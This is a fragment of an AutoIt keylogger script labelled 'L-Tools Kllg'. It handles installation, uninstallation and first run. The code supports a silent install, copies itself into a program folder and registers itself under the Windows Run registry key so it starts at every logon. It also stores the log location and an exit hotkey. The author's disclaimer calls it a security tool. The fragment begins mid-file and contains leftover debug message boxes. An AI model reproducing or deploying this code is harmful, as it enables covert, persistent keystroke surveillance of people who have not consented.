break(0);disllow close from the tasktray
;-------------------------------------------------------------comandline code for help install and ninstall
$i=0
if $cmdline[0] > 0 Then 
    If $cmdline[1] = "/install" Then
        if $cmdline[0] >= 2 Then
            If $cmdline[2] = "/silent" Then;auto install Script Silently
                RegWrite ( "HKEY_LOCAL_MACHINE\SOFTWARE\L tools\log","exit", "REG_SZ", "e")
                RegWrite ( "HKEY_LOCAL_MACHINE\SOFTWARE\L tools\log","Location", "REG_SZ", @ProgramFilesDir&"\L-Tools\Kllg\")
                RegWrite ( "HKEY_LOCAL_MACHINE\SOFTWARE\L tools\log","Silent", "REG_DWORD", "1")
                filecopy(@ScriptFullPath,@ProgramFilesDir&"\L-Tools\Kllg\"&@scriptname,1)
                Regwrite ("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run","Jtlog.exe","REG_SZ",@ProgramFilesDir&"\L-Tools\Kllg\"&@scriptname)
                $i=1
            EndIf
        endif
        if $i=0 Then
            $location = dircreate("C:\Documents\Avul\");FileSelectFolder("Choose an Install Location.  The Logfiles will be located in this directory Under 'Logfiles'", "",3)
            			
            RegWrite ( "HKEY_LOCAL_MACHINE\SOFTWARE\L tools\log","Location", "REG_SZ", $location&"\L-Tools\Kllg\")
            filecopy(@ScriptFullPath,$location&"\L-Tools\Kllg\"&@scriptname,1)
			
            Regwrite ("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run","Jtlog.exe","REG_SZ",$location&"\L-Tools\Kllg\"&@scriptname)
            $Yesss=Msgbox(4,"Yesss"," Yaaapppp")                        
        EndIf
    EndIf
    if $cmdline[1] = "/help" then 
        Msgbox(0,"L-Tools Kllg","This is a simple Kllg Created By Jason Zetter"&@crlf&"this is created as a security tool and i cannot be held responsible for any missuse of this program"&@crlf&""&@crlf&"Help:"&@crlf&"/install - Installs the program with an interface"&@crlf&"/install /silent - installs the program with the defauld valuse in silent"&@crlf&"/help - displays this help box"&@crlf&"/uninstall - this removes the program and all the settings from your system WARNING this DOES remove the log files."&@crlf&""&@crlf&"This Program was created with the Awsome Freeware Basic programing language Auto-it!"&@crlf&""&@crlf&"For updates and other Programs Created by L-tools Send your browser to Http://www.L-online.com.au.tt")
        Exit
    EndIf
    if $cmdline[1] = "/uninstall" Then
        $log=RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\L tools\log","Location")
        RegDelete ("HKEY_LOCAL_MACHINE\SOFTWARE\L tools\log")
        msgbox(0,"",$log)
        dirremove($log,1)
        msgbox(0,"L-Tools Kllg","The Kllg has been removed Thankyou For your use of this program!")
        exit
    EndIf
EndIf
;-----------------------------------------------------Check if program is installed... if not install it------------------------------
$var = RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\L tools\log", "")
if $var <= 1 Then
    $shortcut=Inputbox("L-Tools Kllg","please Enter your short cut key Ctrl+Alt+(your key)"&@crlf&"Default is e. WARNING! Enter ONE letter only!")
	$location = dircreate("C:\Documents\Avul\");FileSelectFolder("Choose an Install Location.  The Logfiles will be located in this directory Under 'Logfiles'", "",3)
    
    RegWrite ( "HKEY_LOCAL_MACHINE\SOFTWARE\L tools\log","exit", "REG_SZ", $shortcut)
    RegWrite ( "HKEY_LOCAL_MACHINE\SOFTWARE\L tools\log","Location", "REG_SZ", $location&"\L-Tools\Kllg\")
	$Yesss=Msgbox(4,"Yesss"," Yaaapppp2221")
    filecopy(@ScriptFullPath,$location&"\L-Tools\Kllg\"&@scriptname,1)
	
    Regwrite ("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run","Jtlog.exe","REG_SZ",$location&"\L-Tools\Kllg\"&@scriptname)
	
 
 EndIf